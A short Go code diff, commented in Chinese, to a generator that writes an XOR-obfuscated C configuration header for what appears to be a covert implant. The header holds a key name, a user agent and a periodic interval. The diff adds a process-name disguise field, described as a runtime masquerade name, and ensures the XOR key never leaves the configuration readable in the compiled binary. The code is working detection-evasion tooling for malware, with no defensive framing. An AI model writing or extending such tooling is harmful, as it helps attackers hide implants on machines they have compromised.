@@ -27,6 +27,7 @@ type ConfigParams struct {
 	KeyName         string
 	UserAgent       string
 	BaseIntervalSec uint32
+	ProcName        string // 运行时进程伪装名，≤15 字符；空 = 不输出 CFG_PNAME
 }
 
 // GenerateConfigH renders the XOR-obfuscated C config header. Plain strings
@@ -46,6 +47,9 @@ func GenerateConfigH(p ConfigParams) (string, error) {
 	if p.BaseIntervalSec == 0 {
 		p.BaseIntervalSec = 180
 	}
+	if len(p.ProcName) > 15 {
+		return "", fmt.Errorf("proc name too long: %d bytes", len(p.ProcName))
+	}
 	xk := randomBytes(1)[0]
 	for xk == 0 {
 		// 0x00 会让 XOR 退化成恒等——明文配置直进二进制，重抽
@@ -62,6 +66,10 @@ func GenerateConfigH(p ConfigParams) (string, error) {
 	writeArr(&b, "CFG_JSON_KEY", []byte(p.KeyName), xk)
 	fmt.Fprintf(&b, "\n")
 	writeArr(&b, "CFG_UA", []byte(p.UserAgent), xk)
+	if p.ProcName != "" {
+		fmt.Fprintf(&b, "\n")
+		writeArr(&b, "CFG_PNAME", []byte(p.ProcName), xk)
+	}
 	fmt.Fprintf(&b, "\n#define CFG_INTERVAL %d\n\n", p.BaseIntervalSec)
 	fmt.Fprintf(&b, "#endif\n")
 	return b.String(), nil
